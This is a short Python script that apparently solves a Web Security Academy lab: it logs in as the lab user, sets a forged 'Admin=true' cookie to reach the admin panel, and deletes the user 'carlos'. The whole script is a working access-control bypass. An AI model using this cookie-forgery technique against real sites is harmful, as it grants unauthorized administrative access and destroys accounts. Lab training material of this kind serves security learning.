import requests
from bs4 import BeautifulSoup

s = requests.Session()
site = 'ac9c1f6b1fc2dfff8050317a00860006.web-security-academy.net'
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : 'wiener',
    'password' : 'peter'
}
resp = s.post(login_url, data=logindata)

cookie_obj = requests.cookies.create_cookie(domain=site, name='Admin',value='true')
s.cookies.set_cookie(cookie_obj)

url = f'https://{site}/admin'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')

carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]

delete_uri = carlos_delete_link[0]['href']
s.get(f'https://{site}{delete_uri}')